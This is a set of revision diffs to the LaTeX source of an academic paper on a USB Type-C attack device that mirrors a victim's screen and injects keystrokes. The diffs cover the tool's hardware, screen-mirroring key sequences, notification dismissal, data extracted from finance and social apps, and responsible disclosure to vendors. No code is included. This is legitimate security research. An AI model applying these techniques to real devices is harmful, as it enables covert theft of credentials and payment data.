 \tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.
@@
 USBeSafe\cite{usbesafe} analyses the 
-feature vector constructed with the data collected from \acp{URB}, 
+feature vector constructed with the data collected from USB Request Blocks, 
 detects the novel \ac{USB} packets based on the machine learning algorithm and sends 

### 2021-03-19 WOOT/Files/background.tex

@@
 This means every device needs its own driver to work. After \ac{HID}, users only need to
-write one driver for an entire class of \acp{HID}. Furthermore, \ac{HID} standard also
+write one driver for an entire class of \acp{HID}. Furthermore, the \ac{HID} standard also
 requires all devices to be \ac{PnP}, which is indeed
@@
 %\noindent\outline{USB2.0}\\
-In 2000, \ac{USB} 2.0~\cite{usb20} specification was released. With high speed \mbox{(480
+In 2000, the \ac{USB} 2.0~\cite{usb20} specification was released. With high speed \mbox{(480
 Mbit/s)} mode introduced, printers, cameras, CD-ROM drives, and network cards were
@@
 %\noindent\outline{Security Problem}\\
-During the development of \ac{USB} specification, security was insufficiently considered~\cite{sok}. 
+During the development of the \ac{USB} specification, security was insufficiently considered~\cite{sok}. 
 The \ac{USB}-IF believes it is the duty of \acp{OEM}

### 2021-03-19 WOOT/Files/experiment.tex
experiment revised

@@
 
-To further validate our attacking scenario, we conducted an experiment to simulate a real-world attack scenario.
+\subsubsection{Experiment}
+
+To further test the capabilities of \tool in this attack scenario, we conducted a simulation experiment.
 We selected 11 applications on \mbox{\textit{HUAWEI P30 (ELE-AL00)}}, test each application with the following strategy
-\ding{182} Attach \tool to the test device.
-\ding{183} Login in with a test account.
-\ding{184} Keep the default settings.
-\ding{185} Simulate daily usage of the application.
+\ding{182} Login in with a test account.
+\ding{183} Keep the default settings.
+\ding{184} Attach attacker's \tool to the test device.
+\ding{185} Simulate victim's daily usage of the application.
 
-During this experiment, we first tested full control mode which actively gathered sensitive information, then tested video capture mode which passively collected the sensitive information visited by victims.
-We noticed that, most sensitive information could be gathered directly through full control mode without victim's interaction, but there was also certain information that had to be collected passively through video capture mode.
-For example, as illustrated in Table~\ref{table:information_extracted}, in most applications, information like `Account' can be gathered directly while information like `Payment Password' cannot be collected until the victim inputs his/her password.
+During this experiment, we tested full control mode which actively obtained sensitive information and video capture mode which passively obtained the sensitive information visited by the victim.
+We noticed that, most sensitive information could be obtained directly through full control mode without victim's interaction, but there was also certain information that had to be obtained passively through video capture mode.
+For example, as illustrated in Table~\ref{table:information_extracted}, in most applications, information like ``Account'' can be obtained directly while information like ``Payment Password'' cannot be obtained until the victim inputs his/her password.
 
 \subsubsection{Result}
-In summary, as shown in Table~\ref{table:information_extracted}, our \tool is able to actively gather most sensitive information such as browsing history, personal account, phone number without victim's interaction.
-There also exists information such as payment password that is not available immediately, but such a piece of information can be collected once the victim input it on his/her smartphone.
-The gathered information can be further used to deduce victim's lock screen password and poses even greater threat to victim's privacy.
+In summary, \tool is able to actively obtain most sensitive information from the screen, such as browsing history, personal account, phone number without victim's interaction.
+There also exists information such as payment password that is not available immediately, but such a piece of information can be obtained once the victim inputs it.
+The obtained information can be further used to guess the victim's lock screen password and poses even greater threat to victim's privacy.
 

### 2021-03-19 WOOT/Files/experiment.tex
table

@@
 		\hline
-		Social \& Finance App 				& WeChat      & Account, Property Status, Chat History, Payment Code   		& Payment Password \\
+		Social \& Finance App 				& WeChat      & Account, Financial Status, Chat History, Payment Code   		& Payment Password \\
 		\hline
-		\multirow{3}{*}{Social App}
-											%& QQ          & Account, Interpersonal Nexus, Chat History   	& \\
+		\multirow{2}{*}{Social App}
+											%& QQ          & Account, Contacts, Chat History   	& \\
 											%\cline{2-4}
-							       			& WhatsApp    & Account, Interpersonal Nexus, Chat History, Phone Number    & \\
+							       			& WhatsApp    & Account, Contacts, Chat History, Phone Number    & \\
 											\cline{2-4}
-							       			& Facebook    & Account, Posts, Interpersonal Nexus, Contact Info           & \\
+							       			& Facebook    & Account, Posts, Contacts           & \\
 		\hline
-		\multirow{3}{*}{Finance App}       	& Alipay      & Account, Property Status, Payment Code         				& Payment Password \\
+		\multirow{3}{*}{Finance App}       	& Alipay      & Account, Financial Status, Payment Code         				& Payment Password \\
 											\cline{2-4}
@@
 		\hline
-		\multirow{2}{*}{System}             &  Messages   & Interpersonal Nexus, Chat History, Contacts' Phone Number &   \\
+		\multirow{3}{*}{System}             &  Messages   & Contacts, Chat History				 &   \\
 											\cline{2-4}

### 2021-03-19 WOOT/Files/experiment.tex
version

@@
 															\cline{3-4}
-											&				& \textbf{Without Authentication}						& \textbf{With Authentication} \\
+											&				& \textbf{Without Victim's Interaction}						& \textbf{With Victim's Interaction} \\
 		\hline
-		Social \& Finance App 				& WeChat      & Account, Financial Status, Chat History, Payment Code   		& Payment Password \\
+		Social \& Finance App 				& WeChat (8.0.1)      & Account, Financial Status, Chat History, Payment Code   		& Payment Password \\
 		\hline
@@
 											%\cline{2-4}
-							       			& WhatsApp    & Account, Contacts, Chat History, Phone Number    & \\
+							       			& WhatsApp (2.21.5.18)    & Account, Contacts, Chat History, Phone Number    & \\
 											\cline{2-4}
-							       			& Facebook    & Account, Posts, Contacts           & \\
+							       			& Facebook (309.0.0.47.119)   & Account, Posts, Contacts           & \\
 		\hline
-		\multirow{3}{*}{Finance App}       	& Alipay      & Account, Financial Status, Payment Code         				& Payment Password \\
+		\multirow{3}{*}{Finance App}       	& Alipay (10.2.15.9500)      & Account, Financial Status, Payment Code         				& Payment Password \\
 											\cline{2-4}
-											& Cash App    & Email, Phone Number, Cash Balance							& Payment Password \\
+											& Cash App (3.35.1)   & Email, Phone Number, Cash Balance							& Payment Password \\
 											\cline{2-4}
-											& Paypal      & Account, PayPal Balance     								& Payment Password \\
+											& Paypal (7.38.1)      & Account, PayPal Balance     								& Payment Password \\
 		\hline
-		\multirow{1}{*}{Shopping App}		& Amazon Shopping  & Account, Orders, Shopping Cart         				& \\
+		\multirow{1}{*}{Shopping App}		& Amazon Shopping (22.6.0.100)  & Account, Orders, Shopping Cart         				& \\
 											%\cline{2-4}
@@
 		\hline
-		\multirow{2}{*}{Tool}               & Chrome      & Browsing History                                	& \\
+		\multirow{2}{*}{Tool}               & Chrome (89.0.4389.72)      & Browsing History                                	& \\
 											\cline{2-4}
-		                					& Health      & Personal Health Metrics      						& \\
+		                					& Health (11.0.5.508)      & Personal Health Metrics      						& \\
 		\hline
-		\multirow{3}{*}{System}             &  Messages   & Contacts, Chat History				 &   \\
+		\multirow{3}{*}{System}             &  Messages (11.0.1.430)   & Contacts, Chat History				 &   \\
 											\cline{2-4}
-											& Settings - WiFi   & WiFi SSID                                	&  WiFi Password \\
+											& Settings (11.0.0.300) - WiFi   & WiFi SSID                                	&  WiFi Password \\
 											\cline{2-4}
-		                					& Settings - VPN    & VPN Address, VPN Account, VPN Password      						& \\
+		                					& Settings (11.0.0.300) - VPN    & VPN Address, VPN Account, VPN Password      						& \\
 		\hline

### 2021-03-20 WOOT/Files/related_work.tex
JFA

@@
 JFA~\cite{JFC}, short for Juice Filming Attacks,
-abuses this standard and monitoring victim's device utilizing \ac{USB} 2.0 protocol. Although the JFA~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
+abuses this standard and monitoring the victim's device utilizing \ac{USB} 2.0 protocol. Although the JFA~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
 there are two main limitation compared with \tool: 
@@
 All data can be collected by JFA only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injection.
-For example, if the victim leaves his/her phone charging without locking it, the JFA cannot obtain anything in this case, while \tool can actively control victim's device and gather sensitive information.
-\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of JFA.
+For example, if the victim leaves his/her phone charging without locking it, JFA cannot obtain anything in this case, while \tool can actively control his/her device and gather sensitive information.
+\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of JFA.
 \tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.

### 2021-03-20 WOOT/Files/introduction.tex
Limitations in intro
revised paper round 2

@@
 above and implemented a multi-mode attack model of \ac{USB}, named \tool.  \tool
-extends BadUSB to support the features of \ac{USB} Type-C.  Since \ac{USB} Type-C can transfer video stream data, \tool could obtain the information of the
+extends BadUSB to support the features of \ac{USB} Type-C.  
+Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as the products of Xiaomi, more and more vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
+Since \mbox{\ac{USB} Type-C} can transfer video stream data, \tool could obtain the information of the
 victim's \ac{GUI} during attacks.  Combining it with the emulation
@@
 %with the graphical interface.
+
 Moreover, we implemented multiple attacking

### 2021-03-20 WOOT/Files/badusb.tex

@@
 
-First, as \tool has established a feedback channel using \ac{USB} 3.2 protocol, when performing keystroke and mouse movement injection, an attacker can obtain real-time feedback from the victim's devices.
+First, as \tool has established a feedback channel using \ac{USB} 3.x protocol, when performing keystroke and mouse movement injection, an attacker can obtain real-time feedback from the victim's devices.
 This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.

### 2021-03-20 WOOT/Files/conclusion.tex
revise responsible disclosure.

@@
 \section{Responsible Disclosure}
-Responsible disclosure have already been carried out, we have already contacted HUAWEI and Apple through proper channel.
-We received response from HUAWEI on \nth{7} March and discussed about the mitigation plan on \nth{10} March while Apple has not responded yet.
-HUAWEI security team has confirmed this issue and been weighing different mitigation approaches.
-We are actively facilitating their mitigating process and waiting for mitigation to be deployed.
-After the mitigation is deployed, HUAWEI will apply a CVE ID for this vulnerability.
+Responsible disclosure have already been carried out, we have contacted HUAWEI and Apple through proper channels.
+We received response from HUAWEI on March \nth{7} and discussed the mitigation plan on March \nth{10} while Apple has not responded yet.
+HUAWEI security team has confirmed this issue and been working on mitigation.
+We are actively facilitating their mitigation process and waiting for a fix to be deployed.
+After the mitigation is deployed, HUAWEI will assign a CVE ID for this vulnerability.

### 2021-03-21 WOOT/Files/experiment.tex
something

@@
 our \tool only requires common components that are easily accessible online or
-in any electronic store. Here we choose the following parts to build a
-prototype. To begin with, we choose the Raspberry Pi 4B~\cite{pi4b} as the embedded Single Board
+in any electronic store. Here we chose the following parts to build a
+prototype. To begin with, we chose the Raspberry Pi 4B~\cite{pi4b} as the embedded Single Board
 Computer inside \tool, which is powerful enough to process video data and has
-an onboard WiFi chip. As for the \ac{HID} Emulator, we use an Atmel ATMEGA32U4 board~\cite{atmel}
+an onboard WiFi chip. As for the \ac{HID} Emulator, we used an Atmel ATMEGA32U4 board~\cite{atmel}
 with \ac{USB} protocol support, which is able to emulate multiple \acp{HID}
-with our modified firmware. About the \ac{USB} 3.x Hub, we use one from
+with our modified firmware. About the \ac{USB} 3.x Hub, we used one from
 UGREEN~\cite{ugreen}, which supports HDMI, \ac{USB} 2.0, and many other exported peripherals.
-Apart from these essential parts, we also use an auxiliary power bank to
+Apart from these essential parts, we also used an auxiliary power bank to
 provide power for the Raspberry Pi and the mobile devices used by the victim.
@@
 Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and Windows 10 is similar.
-In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystroke to set the monitor into mirroring the primary screen.
+In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystrokes to set the monitor into mirroring the primary screen.
 In EMUI, there is a special mode called `Desktop Mode', which allows users to use their smartphones like a desktop computer with an external screen.
@@
 During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
-When first plugged in, the victim's devices raised a pop-up window asking victims what mode should the new screen be set to.
+When first plugged in, the victim's device raised a pop-up window asking the victim which mode should the new screen be set to.
 \tool immediately injected a sequence of mouse movements and clicks to set itself as a mirror to the primary monitor.
@@
 After each experiment, the raw video and the corresponding \ac{OCR} result file was generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
-This protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
+This protects their privacy and is also a mark for us to confirm that the data we found contains their private data.
 At last, he/she would destroy all original files, leave only the desensitized \ac{OCR} results for us.

### 2021-03-21 WOOT/Files/related_work.tex
something

@@
 
-We survey related works on \ac{USB} attacks in Section~\ref{subsec:usb_attack} and
+We surveyed related works on \ac{USB} attacks in Section~\ref{subsec:usb_attack} and
 \ac{USB} security defense in Section~\ref{subsec:usb_defence}, respectively.
@@
 host, they could be recognized as a keyboard or mouse. Then the attacker can
-execute malicious payloads as they were using the victim's devices. Due to the
+execute malicious payloads as they are using the victim's device. Due to the
 limitation of \ac{USB} 2.0~\cite{usb20} protocol, these BadUSB
@@
 be transmitted through the \ac{USB} interface even for \ac{USB} 2.0 protocol. 
-JFA~\cite{JFC}, short for Juice Filming Attacks,
+Juice Filming Attacks(JFA)~\cite{JFC},
 abuses this standard and monitoring the victim's device utilizing \ac{USB} 2.0 protocol. Although the JFA~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
@@
 All data can be collected by JFA only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injection.
-For example, if the victim leaves his/her phone charging without locking it, JFA cannot obtain anything in this case, while \tool can actively control his/her device and gather sensitive information.
+For example, if a victim leaves his/her phone charging without locking it, JFA cannot obtain anything in this case, while \tool can actively control his/her device and gather sensitive information.
 \ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of JFA.
@@
 % Using USB devices to inject code
-Besides attacking from the protocol perspective, previous works\shuqing{re?} used a
+Besides attacking from the protocol perspective, previous works\shuqing{re?} use a
 \ac{USB} device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
@@
 
-From the hardware perspective, the BadUSB attack requires \mbox{`D-' and `D+'} pins which
+From the hardware perspective, the BadUSB attack requires \mbox{(D+ \& D-)} pins which
 are defined by the protocol to transmit data. Without these pins, data cannot 
@@
 on this fact, \ac{USB} Condom~\cite{Condom} is a hardware solution to block data
-channels by adding a blocker in the connector. This blocker can cut off the \mbox{`D-' and `D+'} connection while leaving the power pins intact. However, this method poses
+channels by adding a blocker in the connector. This blocker can cut off the \mbox{(D+ \& D-)} connection while leaving the power pins intact. However, this method poses
 a great challenge to the \ac{PnP} property of \ac{USB}, as once it is deployed, it
@@
 the temporal characteristics of BadUSB-like attacks. This defense mechanism is
-effective because the attacker cannot obtain the screen of the host using
+effective because the attacker cannot obtain the screen of the victim host using
 BadUSB. In this case, the malicious device can only inject keystrokes in a very

### 2021-03-21 WOOT/Files/experiment.tex
say goodbye

@@
 % It is unfortunate that the user study is not part of the paper anymore.
-\iffalse
-
-To further validate our attacking scenario, we invited 10 volunteers, who are students in our university, to participate and conduct a user study.
-Before the user study experiment, we disclosed to the volunteers how their data might be used and request permission from the volunteers and the university ethics review boards.
-During the case study, volunteers took turns to use their phones for half an hour with \tool connected.
-To obtain data close to real-life, they were requested to use phones just as they were normally using sharing power banks.
-At the same time, we used scripts to perform \ac{OCR} recognition for each frame in the videos stream and stored all of the \ac{OCR} results in a database.
-
-After each experiment, the raw video and the corresponding \ac{OCR} result file was generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
-This protects their privacy and is also a mark for us to confirm that the data we found contains their private data.
-At last, he/she would destroy all original files, leave only the desensitized \ac{OCR} results for us.
-%\shuqing{Do we need to mention that agreement the conference required here?}
-%\hongyi{I'm also quite concern about this.}
-
-\subsubsection{Result}
-
-In total, there are 94,058 entries of data from 10 volunteers. An entry is a combination of the case number, the frame number and the desensitized \ac{OCR} result.
-%\shuqing{The data may need to be updated.}
-With these results, we could learn what content the victim visited, especially the privacy data.
-%\fengwei{The following text needs to be revised. It is quite difficult for me to understand. Note that this is important text because reviewers are curious about the result. }
-We searched the result database with the keywords \textit{account, username, password, phone number and email}, as well as the regular expression of email.
-The records searched by such keywords and regular expressions are usually related to privacy information of users.
-For example, when we searched with \textit{account} as a keyword, victim's accounts could be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example} and Table~\ref{table:information_extracted}.
-%\shuqing{Statistics.}
-At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table~\ref{table:information_extracted}.
-
-In summary, though we cannot directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal financial situation, etc., if the user unconsciously unlocks the screen.
-It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
-
-\begin{table*}[t]
-	\centering
-	\begin{tabular}{|l|l|l|l|}
-		\hline
-		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbf{Frame Number} \\ \hline
-		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline
-		username                          & Login Weibo Login with SMS and verification code ......
-+86 151****4587                    & \textless{}user5\textgreater{} & 1947                                   \\ \hline
-		username                          & QQ 14*****50| Login with phone number New user registration 2345678 9 0                    & \textless{}user3\textgreater{} & 4308                                   \\ \hline
-		username                          & connect to *** username h*****l Save account information Open VPN.....
-& \textless{}user6\textgreater{} & 7925                                   \\ \hline
-		phone number                      & Login with phone number ......
-+86 186****2483 |                                           & \textless{}user1\textgreater{} & 313                                    \\ \hline
-		phone number                      & Log in with your mobile phone number. ...... mobile phone number 131****9310 & \textless{}user9\textgreater{} & 210                                    \\ \hline
-		@                                 & contact email 30*******7G@qq.com, contact phone 027-88******                               & \textless{}user7\textgreater{} & 5324                                   \\ \hline
-		@                                 & Account 73*****5@qq.com @qq.com @163.com @gmail.com 	......      & \textless{}user6\textgreater{} & 621                                    \\ \hline
-	\end{tabular}
-	\linebreak
-	\caption{Examples of Searching \ac{OCR} Results with Keywords.}
-	\label{tab:ocr_keyword_example}
-\end{table*}
-
-\begin{table*}[t]
-	\centering
-	\begin{tabular}{|c|c|c|c|c|c|c|}
-		\hline
-		\textbf{Keyword}                               & Account & Password & Phone number & Email & Username & Regexp for email~  \\
-		\hline
-		\textbf{Number of records containing keywords} & 680     & 1,596     & 1,510         & 164   & 522      & 78                 \\
-		\hline
-		\textbf{Total Number of Records} & \multicolumn{6}{c|}{4,172} \\
-		\hline
-	\end{tabular}
-	\linebreak
-	\caption{Privacy Extraction Result.}
-	\label{table:information_extracted}
-\end{table*}
-
-\fi

### 2021-03-21 WOOT/Files/__latexindent_temp.tex

@@
 
-In this part, we survey related works on USB attack in Section~\ref{subsec:usb_attack}, and USB defence security in Section \ref{subsec:usb_defence}, respectively.
+In this part, we surveyed related works on USB attack in Section~\ref{subsec:usb_attack}, and USB defence security in Section \ref{subsec:usb_defence}, respectively.
 
@@
 
-From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which are defined by protocol to transmitting data.
+From the hardware perspective, BadUSB attack requires data lane \mbox{(D+ \& D-)} which are defined by protocol to transmitting data.
 Without these pins, data can't be transferred via USB cable.
 Based on this fact, USB Condom \cite{Condom} is a hardware solution to block data channel by adding blocker in the connector.
-This blocker can cut off the `D-' and `D+' connection while leave power pins intact.
+This blocker can cut off the data lane \mbox{(D+ \& D-)} connection while leave power pins intact.
 However, this method poses a great challenge to plug-and-play property of USB, as once it is deployed, it will stop all USB functions other than charging.

### 2021-03-21 WOOT/Files/badusb.tex

@@
 send constructed \ac{HID} packet to the victim. These constructed \ac{HID} packets are
-interpreted by the victim as valid keystrokes and mouse moves. Thus, the
+interpreted by the victim as valid keystrokes and mouse movements. Thus, the
 attacker can execute arbitrary scripts on the victim's device. This is the
@@
 
-First, as \tool has established a feedback channel using \ac{USB} 3.x protocol, when performing keystroke and mouse movement injection, an attacker can obtain real-time feedback from the victim's devices.
+First, as \tool has established a feedback channel using \ac{USB} 3.x protocol, when performing keystroke and mouse movement injection, an attacker can obtain real-time feedback from the victim's device.
 This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.
@@
 ``valuable'' or not by a customized detector. We implemented a simple
-payment code detector for the proof-of-concept purpose, which demonstrates that we successfully transfer money from a victim to an
+payment code detector for the proof-of-concept purpose, which demonstrates that we successfully transfered money from a victim to an
 attacker. More detail can be obtained in Section~\ref{sec:experiment}.

### 2021-03-21 WOOT/Files/introduction.tex

@@
 extends BadUSB to support the features of \ac{USB} Type-C.  
-Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as the products of Xiaomi, more and more vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
+Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as some non-flagship products of Xiaomi, more and more vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
 Since \mbox{\ac{USB} Type-C} can transfer video stream data, \tool could obtain the information of the
@@
 plugged in for security purposes.  
-Ten volunteers participated in the user study.
-Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information.
 After the validation of our attack model, we

### 2021-03-21 WOOT/Files/related_work.tex
JFA

@@
 be transmitted through the \ac{USB} interface even for \ac{USB} 2.0 protocol. 
-Juice Filming Attacks(JFA)~\cite{JFC},
-abuses this standard and monitoring the victim's device utilizing \ac{USB} 2.0 protocol. Although the JFA~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
+\ac{JFA}~\cite{JFC},
+abuses this standard and monitoring the victim's device utilizing \ac{USB} 2.0 protocol. Although \ac{JFA}~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
 there are two main limitation compared with \tool: 
-\ding{182} JFA~\cite{JFC} can only exfiltrate video data passively from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
-All data can be collected by JFA only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injection.
-For example, if a victim leaves his/her phone charging without locking it, JFA cannot obtain anything in this case, while \tool can actively control his/her device and gather sensitive information.
-\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of JFA.
+\ding{182} \ac{JFA}~\cite{JFC} can only exfiltrate video data passively from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
+All data can be collected by \ac{JFA} only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injection.
+For example, if a victim leaves his/her phone charging without locking it, \ac{JFA} cannot obtain anything in this case, while \tool can actively control his/her device and gather sensitive information.
+\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of \ac{JFA}.
 \tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.
@@
 of the academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exists an attack called JFA~\cite{JFC} which abuses the \ac{MHL}
+exists an attack called \ac{JFA}~\cite{JFC} which abuses the \ac{MHL}
 standard to steal the video stream from the victim. In order to mitigate this
 issue, Meng et al.~\cite{meng2018252} propose a statistical model using status
-like GPU/CPU usage to detect JFA attacks.
+like GPU/CPU usage to detect \ac{JFA} attacks.
 

### 2021-03-22 WOOT/Files/experiment.tex
screen mirror

@@
 		During our experiment, we noticed that some devices did not mirror their screens to our \tool by default.
-In this case, \tool would inject a sequence of keystrokes to set the victim's device into mirror their screens.
-In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' (`Super' is another name for the `Win' key) to switch between different modes for external display.
+In this case, \tool would inject a sequence of keystrokes to set the victim's device to mirror the primary screen.
+In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject ``Win+P'' (The ``Win'' key is the ``Super'' key in Windows and Ubuntu by default) to switch between different modes for external display.
 Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and Windows 10 is similar.
-In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystrokes to set the monitor into mirroring the primary screen.
-In EMUI, there is a special mode called `Desktop Mode', which allows users to use their smartphones like a desktop computer with an external screen.
-If this mode is victim's default setting, \tool can inject mouse movements to switch to mirror mode as \tool can obtain victim's `desktop' in this mode.
+In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{``Command+F1''} keystrokes to set the victim's device to mirror the primary screen.
+In EMUI, there is a special mode called ``Desktop Mode'', which allows users to use their smartphones like a desktop computer with an external screen.
+If this mode is enabled, as victim's ``desktop'' can be obtained, \tool can inject mouse movements to switch to mirror mode.
 		\begin{figure}[H]
@@
 	\item \textbf{Dismiss Notification}:
-		In our experiment, we found that some devices will notify the user the presence of an external screen. During our experiment, the following notifications were raised:
+		In our experiment, we found that some devices would notify the user the presence of an external screen. During our experiment, the following notifications were raised:
 		\begin{itemize}

### 2021-03-22 WOOT/Files/introduction.tex
Update

@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} Emulator Mode, Video Capture Mode, and Full Control Mode.  To improve the
+including \ac{HID} Emulator Mode, Video Capture Mode, and Fully Control Mode.  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to
-preprocess the video data before network transmission.  Moreover, we conducted
+preprocess the video data before network transmission.  
+We conducted
 a series of experiments for each attack mode as well as for different types of
 devices, including smartphones, personal computers, and tablet computers, to
-validate the usability of \tool.  We also conducted a user study for attacks in
-sharing power banks, one of the application scenarios of \tool.  During the
-user study, we obtained a large amount of sensitive data through \tool, since
-users are usually unconscious of the necessity to check the \ac{USB} devices they
-plugged in for security purposes.  
+validate the usability of \tool.  We also conducted a case study for attacks in
+sharing power banks, one of the application scenarios of \tool.  
 After the validation of our attack model, we
@@
 
-    \item We conducted multiple experiments and a user study to validate the
+    \item We conducted a case study and multiple experiments to validate the
 	usability and effectiveness of \tool.  We also proposed several

### 2021-03-22 WOOT/Files/conclusion.tex
Update conclusion.tex
Acknowledgement
Update
Update conclusion.tex
user study remove from conclu

@@
 types of subsequent attacks. By experimenting \tool with mobile phones, tablets,
-and PCs, we further test its ability under different modes. In our user study, we
-obtain and analyze video stream extracted from 10 participants with \tool,
-which demonstrates its capability in a real-life scenario. In the end, we
+and PCs, we further test its ability under different modes. In our experiment, we
+obtain and analyze video stream extracted from 11 applications with \tool,
+which demonstrates its capability in a simulated real-life scenario. In the end, we
 propose a new defense scheme named \textit{isolated UI rendering}, which can
@@
 After the mitigation is deployed, HUAWEI will assign a CVE ID for this vulnerability.
+
+\section{Acknowledgement}
+We are very grateful to our shepherd, Michael Schwarz and the anonymous reviewers for their valuable comments that improved the paper.

### 2021-03-22 WOOT/Files/experiment.tex
Update
Experiment

@@
 			\includegraphics[width=\linewidth]{./Figs/ubuntu_switch.png}\\
-			\caption{Screen Mode Switch in Ubuntu.}
+			\caption{Switching Screen Mode in Ubuntu.}
 			\label{fig:ubuntu_switch}
@@
 
-\shuqing{May use statistics (instead of concrete examples) to explain it.}
+%\shuqing{May use statistics (instead of concrete examples) to explain it.}
 
@@
 \subsubsection{Attack Scenario}
+\label{subsec:attack-scenario}
 
@@
 
-To further test the capabilities of \tool in this attack scenario, we conducted a simulation experiment.
-We selected 11 applications on \mbox{\textit{HUAWEI P30 (ELE-AL00)}}, test each application with the following strategy
-\ding{182} Login in with a test account.
-\ding{183} Keep the default settings.
-\ding{184} Attach attacker's \tool to the test device.
-\ding{185} Simulate victim's daily usage of the application.
+We conducted experiments to further validate the capabilities of \tool 
+in the attack scenario introduced in Section~\ref{subsec:attack-scenario}.
+11 applications were selected and tested on \mbox{\textit{HUAWEI P30 (ELE-AL00)}} step by step:
+(1) Login in with a test account.
+(2) Keep the default settings.
+(3) Attach attacker's \tool to the test device.
+(4) Simulate victim's daily usage of the application.
 

### 2021-03-22 WOOT/Files/background.tex
something
grammar

@@
 Right after one year of the appearance of \ac{USB} 1.0, a standard named \acf{HID}~\cite{hid} was designed based on \ac{USB}. \ac{HID} is
-designed with to unify the implementation for devices like mice,
-keyboards, etc. Before its appearance, the standard is divided between
+designed to unify the implementation for devices like mice,
+keyboards, etc. Before its appearance, the standard is divided among
 manufacturers, for example, the mouse of Company A may use X-Y coordinates to
@@
 provided two data transfer rates which are low speed (1.5 Mbit/s) and full
-speed (12 MBit/s). At this point, due to the transfer limit, it only supports
+speed (12 MBit/s). At this point, due to the transfer limitation, it only supports
 limited types of devices like keyboards, mice, etc.

### 2021-03-22 WOOT/Files/badusb.tex
grammar

@@
 and disks, which makes the attacks less effective; \ding{183} accurate attacks
-could not be performed due to lack of \ac{UI} status. Whatever \acp{HID} the
+could not be performed due to a lack of \ac{UI} status. Whatever \acp{HID} the
 attackers simulate their \ac{USB} devices to be, they could not obtain the \ac{UI} to
@@
 \textbf{\ac{HID} Emulation Mode.} This mode mainly relies on the ``\ac{HID} Emulator'' in Figure~\ref{fig:attack_model} to
-send constructed \ac{HID} packet to the victim. These constructed \ac{HID} packets are
-interpreted by the victim as valid keystrokes and mouse movements. Thus, the
-attacker can execute arbitrary scripts on the victim's device. This is the
-function of the original BadUSB. Based on this, we made the following
+send constructed \ac{HID} packets to the victim. These constructed \ac{HID} packets are
+interpreted by the victim as valid keystrokes and mouse movements. Thus, attackers can execute arbitrary scripts on the victim's device. This is the
+function of BadUSB. Based on this, we made the following
 improvements.
 
-First, as \tool has established a feedback channel using \ac{USB} 3.x protocol, when performing keystroke and mouse movement injection, an attacker can obtain real-time feedback from the victim's device.
